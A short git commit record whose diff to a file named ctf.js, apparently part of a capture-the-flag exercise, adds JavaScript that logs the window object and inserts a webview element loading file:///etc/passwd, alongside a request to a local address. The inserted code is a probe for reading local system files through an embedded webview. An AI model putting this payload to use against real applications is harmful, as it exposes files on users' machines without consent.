cd4f1aba920b45a6e1d4c39c8e58fb9bea5ee250
0xOZ <52073989+0x0OZ@users.noreply.github.com>
2024-06-22 18:12:03 +0300

    Update ctf.js

--- ctf.js
+++ ctf.js
@@ -1,1 +1,7 @@
+
+console.log(window)
+console.log(this)
+let elm = document.createElement('webview');elm.src = 'file:///etc/passwd';document.body.appendChild(elm);
+console.log(window)
+
 fetch("http://127.0.0.1/oz")
